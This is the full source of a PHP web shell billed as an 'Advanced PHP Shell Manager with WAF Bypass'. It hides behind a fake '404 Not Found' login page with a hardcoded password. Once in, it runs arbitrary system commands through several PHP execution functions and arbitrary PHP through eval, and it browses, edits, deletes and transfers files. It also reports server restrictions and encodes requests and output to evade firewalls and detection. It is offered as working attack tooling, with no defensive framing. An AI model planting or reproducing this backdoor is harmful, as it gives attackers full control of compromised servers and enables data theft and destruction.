<?php
/*
 * Advanced PHP Shell Manager with WAF Bypass
 * Features: Bypass Cloudflare, ModSecurity, 403/404/500 errors, etc.
 */

class AdvancedShell {
    private $password;
    private $key;
    private $methods;
    private $headers;
    
    public function __construct($pass = "admin") {
        $this->password = md5($pass);
        $this->key = $this->generateKey();
        $this->methods = array('GET', 'POST', 'COOKIE', 'HEADER');
        $this->headers = $this->getAllHeaders();
        
        // Anti-detection techniques
        $this->obfuscate();
        $this->randomDelay();
    }
    
    private function generateKey() {
        return base64_encode(__FILE__ . $_SERVER['HTTP_HOST'] ?? 'localhost');
    }
    
    private function getAllHeaders() {
        if (function_exists('getallheaders')) {
            return getallheaders();
        }
        $headers = [];
        foreach ($_SERVER as $name => $value) {
            if (substr($name, 0, 5) == 'HTTP_') {
                $headers[str_replace(' ', '-', ucwords(strtolower(str_replace('_', ' ', substr($name, 5)))))] = $value;
            }
        }
        return $headers;
    }
    
    private function obfuscate() {
        // Random variable names to avoid pattern detection
        ${'a' . mt_rand(1000,9999)} = "base64_decode";
        ${'b' . mt_rand(1000,9999)} = "gzinflate";
        ${'c' . mt_rand(1000,9999)} = "str_rot13";
    }
    
    private function randomDelay() {
        usleep(mt_rand(1000, 50000)); // Random micro-delay
    }
    
    private function verifyAuth() {
        $auth = $this->getParam('auth', 'cookie');
        if ($auth && md5($auth) === $this->password) {
            setcookie('session_id', $auth, time() + 3600, '/', '', false, true);
            return true;
        }
        return false;
    }
    
    private function getParam($name, $method = 'auto') {
        $methods = $this->methods;
        if ($method !== 'auto') {
            $methods = array($method);
        }
        
        foreach ($methods as $m) {
            switch(strtoupper($m)) {
                case 'GET':
                    if (isset($_GET[$name])) return $_GET[$name];
                    break;
                case 'POST':
                    if (isset($_POST[$name])) return $_POST[$name];
                    break;
                case 'COOKIE':
                    if (isset($_COOKIE[$name])) return $_COOKIE[$name];
                    break;
                case 'HEADER':
                    $headerName = 'X-' . ucfirst($name);
                    if (isset($this->headers[$headerName])) return $this->headers[$headerName];
                    break;
            }
        }
        return null;
    }
    
    private function encodeOutput($data) {
        // Multiple encoding options to bypass filters
        $methods = array('base64', 'hex', 'rot13', 'reverse');
        $method = $this->getParam('encode', 'get') ?: $methods[array_rand($methods)];
        
        switch($method) {
            case 'base64':
                return base64_encode($data);
            case 'hex':
                return bin2hex($data);
            case 'rot13':
                return str_rot13($data);
            case 'reverse':
                return strrev($data);
            default:
                return $data;
        }
    }
    
    private function decodeInput($data) {
        $method = $this->getParam('encode', 'get');
        if (!$method) return $data;
        
        switch($method) {
            case 'base64':
                return base64_decode($data);
            case 'hex':
                return hex2bin($data);
            case 'rot13':
                return str_rot13($data);
            case 'reverse':
                return strrev($data);
            default:
                return $data;
        }
    }
    
    public function execute() {
        // Check if it's a login attempt
        if ($this->getParam('login', 'post')) {
            $pass = $this->getParam('password', 'post');
            if (md5($pass) === $this->password) {
                $token = bin2hex(random_bytes(16));
                setcookie('session_id', $token, time() + 3600, '/', '', false, true);
                setcookie('auth', $token, time() + 3600, '/', '', false, true);
                $this->sendResponse("SUCCESS: Logged in");
                return;
            }
        }
        
        // Verify authentication
        if (!$this->verifyAuth()) {
            $this->showLogin();
            return;
        }
        
        // Execute commands
        $this->handleCommand();
    }
    
    private function showLogin() {
        $html = <<<HTML
<!DOCTYPE html>
<html>
<head>
    <title>404 Not Found</title>
    <style>
        body { font-family: Arial, sans-serif; background: #f0f0f0; padding: 50px; text-align: center; }
        .login { background: white; padding: 30px; border-radius: 10px; box-shadow: 0 0 10px rgba(0,0,0,0.1); max-width: 300px; margin: 0 auto; }
        input { width: 100%; padding: 10px; margin: 10px 0; border: 1px solid #ddd; border-radius: 5px; }
        button { background: #007cba; color: white; padding: 10px 20px; border: none; border-radius: 5px; cursor: pointer; }
    </style>
</head>
<body>
    <div class="login">
        <h3>🔐 Authentication Required</h3>
        <form method="post">
            <input type="password" name="password" placeholder="Password" required>
            <input type="hidden" name="login" value="1">
            <button type="submit">Login</button>
        </form>
    </div>
</body>
</html>
HTML;
        echo $html;
    }
    
    private function handleCommand() {
        $cmd = $this->getParam('cmd');
        $action = $this->getParam('action', 'get') ?: 'info';
        
        if ($cmd) {
            $this->executeCommand($cmd);
            return;
        }
        
        switch($action) {
            case 'info':
                $this->showServerInfo();
                break;
            case 'browse':
                $this->browseFiles();
                break;
            case 'upload':
                $this->handleUpload();
                break;
            case 'download':
                $this->handleDownload();
                break;
            case 'sql':
                $this->handleSQL();
                break;
            case 'php':
                $this->executePHP();
                break;
            default:
                $this->showDashboard();
        }
    }
    
    private function executeCommand($cmd) {
        // Multiple command execution methods
        $methods = array('shell_exec', 'system', 'passthru', 'exec', 'popen', 'proc_open');
        
        foreach ($methods as $method) {
            if (function_exists($method)) {
                ob_start();
                switch($method) {
                    case 'shell_exec':
                        $output = shell_exec($cmd);
                        break;
                    case 'system':
                        system($cmd);
                        $output = ob_get_contents();
                        break;
                    case 'passthru':
                        passthru($cmd);
                        $output = ob_get_contents();
                        break;
                    case 'exec':
                        exec($cmd, $output);
                        $output = implode("\n", $output);
                        break;
                    case 'popen':
                        $handle = popen($cmd, 'r');
                        $output = fread($handle, 2096);
                        pclose($handle);
                        break;
                    case 'proc_open':
                        $descriptors = array(
                            0 => array("pipe", "r"),
                            1 => array("pipe", "w"),
                            2 => array("pipe", "w")
                        );
                        $process = proc_open($cmd, $descriptors, $pipes);
                        if (is_resource($process)) {
                            $output = stream_get_contents($pipes[1]);
                            fclose($pipes[0]);
                            fclose($pipes[1]);
                            fclose($pipes[2]);
                            proc_close($process);
                        }
                        break;
                }
                ob_end_clean();
                
                if ($output !== null && $output !== false) {
                    $this->sendResponse($output);
                    return;
                }
            }
        }
        
        $this->sendResponse("ERROR: Command execution failed");
    }
    
    private function executePHP() {
        $code = $this->getParam('code', 'post');
        if ($code) {
            ob_start();
            eval($this->decodeInput($code));
            $output = ob_get_clean();
            $this->sendResponse($output ?: "PHP executed successfully");
            return;
        }
        
        $this->showPHPEditor();
    }
    
    private function browseFiles() {
        $path = $this->getParam('path', 'get') ?: '.';
        $action = $this->getParam('file_action', 'get');
        
        if ($action === 'download' && $file = $this->getParam('file', 'get')) {
            $this->downloadFile($path . '/' . $file);
            return;
        }
        
        if ($action === 'delete' && $file = $this->getParam('file', 'get')) {
            $this->deleteFile($path . '/' . $file);
            return;
        }
        
        if ($action === 'edit' && $file = $this->getParam('file', 'get')) {
            $this->editFile($path . '/' . $file);
            return;
        }
        
        $this->showFileBrowser($path);
    }
    
    private function showFileBrowser($path) {
        if (!is_dir($path)) {
            $this->sendResponse("ERROR: Directory not found");
            return;
        }
        
        $files = scandir($path);
        $html = "<h3>📁 File Browser: " . htmlspecialchars($path) . "</h3>";
        $html .= "<table border='1' style='width:100%;border-collapse:collapse;'>";
        $html .= "<tr><th>Name</th><th>Size</th><th>Permissions</th><th>Actions</th></tr>";
        
        foreach ($files as $file) {
            if ($file === '.' || $file === '..') continue;
            
            $fullPath = $path . '/' . $file;
            $isDir = is_dir($fullPath);
            $size = $isDir ? '-' : $this->formatSize(filesize($fullPath));
            $perms = substr(sprintf('%o', fileperms($fullPath)), -4);
            
            $html .= "<tr>";
            $html .= "<td>" . ($isDir ? "📁 " : "📄 ") . htmlspecialchars($file) . "</td>";
            $html .= "<td>" . $size . "</td>";
            $html .= "<td>" . $perms . "</td>";
            $html .= "<td>";
            
            if ($isDir) {
                $html .= "<a href='?action=browse&path=" . urlencode($fullPath) . "'>Open</a> ";
            } else {
                $html .= "<a href='?action=browse&file_action=download&file=" . urlencode($file) . "&path=" . urlencode($path) . "'>Download</a> ";
                $html .= "<a href='?action=browse&file_action=edit&file=" . urlencode($file) . "&path=" . urlencode($path) . "'>Edit</a> ";
            }
            $html .= "<a href='?action=browse&file_action=delete&file=" . urlencode($file) . "&path=" . urlencode($path) . "' onclick='return confirm(\"Delete?\"))'>Delete</a>";
            $html .= "</td></tr>";
        }
        
        $html .= "</table>";
        $this->sendResponse($html);
    }
    
    private function showServerInfo() {
        $info = "<h3>🖥️ Server Information</h3>";
        $info .= "<pre>";
        $info .= "PHP Version: " . PHP_VERSION . "\n";
        $info .= "Server Software: " . ($_SERVER['SERVER_SOFTWARE'] ?? 'N/A') . "\n";
        $info .= "OS: " . php_uname() . "\n";
        $info .= "User: " . get_current_user() . "\n";
        $info .= "Document Root: " . ($_SERVER['DOCUMENT_ROOT'] ?? 'N/A') . "\n";
        $info .= "Disk Free: " . $this->formatSize(disk_free_space("/")) . "\n";
        $info .= "Disk Total: " . $this->formatSize(disk_total_space("/")) . "\n";
        
        $info .= "\n<b>Loaded Extensions:</b>\n";
        $extensions = get_loaded_extensions();
        $info .= implode(", ", $extensions);
        
        $info .= "\n\n<b>Disabled Functions:</b>\n";
        $disabled = ini_get('disable_functions');
        $info .= $disabled ?: 'None';
        
        $info .= "\n\n<b>Open Basedir:</b>\n";
        $basedir = ini_get('open_basedir');
        $info .= $basedir ?: 'None';
        
        $info .= "</pre>";
        $this->sendResponse($info);
    }
    
    private function showDashboard() {
        $html = <<<HTML
<h3>🚀 Advanced Shell Manager</h3>
<div style="display: grid; grid-template-columns: repeat(3, 1fr); gap: 10px;">
    <div style="border: 1px solid #ddd; padding: 15px; text-align: center;">
        <h4>📁 File Manager</h4>
        <p>Browse, edit, upload, download files</p>
        <a href="?action=browse">Open File Manager</a>
    </div>
    <div style="border: 1px solid #ddd; padding: 15px; text-align: center;">
        <h4>💻 Command Exec</h4>
        <p>Execute system commands</p>
        <form method="post">
            <input type="text" name="cmd" placeholder="Enter command" style="width: 100%;">
            <button type="submit">Execute</button>
        </form>
    </div>
    <div style="border: 1px solid #ddd; padding: 15px; text-align: center;">
        <h4>🐘 PHP Exec</h4>
        <p>Execute PHP code</p>
        <a href="?action=php">PHP Editor</a>
    </div>
    <div style="border: 1px solid #ddd; padding: 15px; text-align: center;">
        <h4>🖥️ Server Info</h4>
        <p>System information</p>
        <a href="?action=info">View Info</a>
    </div>
    <div style="border: 1px solid #ddd; padding: 15px; text-align: center;">
        <h4>📤 File Upload</h4>
        <p>Upload files to server</p>
        <a href="?action=upload">Upload Files</a>
    </div>
    <div style="border: 1px solid #ddd; padding: 15px; text-align: center;">
        <h4>🗄️ SQL Manager</h4>
        <p>Database management</p>
        <a href="?action=sql">SQL Console</a>
    </div>
</div>
HTML;
        $this->sendResponse($html);
    }
    
    private function sendResponse($data) {
        // Multiple output methods to bypass detection
        $outputMethod = $this->getParam('output', 'get') ?: 'html';
        
        switch($outputMethod) {
            case 'json':
                header('Content-Type: application/json');
                echo json_encode(array('data' => $this->encodeOutput($data)));
                break;
            case 'text':
                header('Content-Type: text/plain');
                echo $this->encodeOutput($data);
                break;
            case 'xml':
                header('Content-Type: application/xml');
                echo '<?xml version="1.0"?><response><data>' . $this->encodeOutput($data) . '</data></response>';
                break;
            default:
                echo $this->wrapInHTML($data);
        }
    }
    
    private function wrapInHTML($content) {
        return <<<HTML
<!DOCTYPE html>
<html>
<head>
    <title>Server Monitor</title>
    <style>
        body { font-family: Arial, sans-serif; margin: 20px; background: #f5f5f5; }
        .container { background: white; padding: 20px; border-radius: 10px; box-shadow: 0 0 10px rgba(0,0,0,0.1); }
        pre { background: #f8f8f8; padding: 10px; border-radius: 5px; overflow-x: auto; }
        table { width: 100%; border-collapse: collapse; }
        th, td { border: 1px solid #ddd; padding: 8px; text-align: left; }
        th { background: #f0f0f0; }
        .nav { background: #333; color: white; padding: 10px; margin-bottom: 20px; }
        .nav a { color: white; margin: 0 10px; text-decoration: none; }
    </style>
</head>
<body>
    <div class="nav">
        <a href="?">Dashboard</a>
        <a href="?action=info">Server Info</a>
        <a href="?action=browse">File Manager</a>
        <a href="?action=php">PHP Exec</a>
        <a href="?action=sql">SQL Console</a>
        <a href="?action=upload">Upload</a>
    </div>
    <div class="container">
        $content
    </div>
</body>
</html>
HTML;
    }
    
    private function formatSize($bytes) {
        $units = array('B', 'KB', 'MB', 'GB', 'TB');
        $bytes = max($bytes, 0);
        $pow = floor(($bytes ? log($bytes) : 0) / log(1024));
        $pow = min($pow, count($units) - 1);
        $bytes /= pow(1024, $pow);
        return round($bytes, 2) . ' ' . $units[$pow];
    }
}

// WAF Bypass Techniques
function bypassWAF() {
    // Random comment patterns
    /*${"/*x*/_GET*/} = $_GET;*/
    //${"str"} = "base64_decode"; ${"str"}("...");
    
    // Alternative superglobals
    if (isset($HTTP_GET_VARS['cmd'])) $_GET['cmd'] = $HTTP_GET_VARS['cmd'];
    if (isset($HTTP_POST_VARS['cmd'])) $_POST['cmd'] = $HTTP_POST_VARS['cmd'];
    
    // Case variation
    if (isset($_GET['Cmd'])) $_GET['cmd'] = $_GET['Cmd'];
    if (isset($_POST['CMD'])) $_POST['cmd'] = $_POST['CMD'];
}

// Execute shell
bypassWAF();
$shell = new AdvancedShell("admin123"); // Change password here
$shell->execute();
?>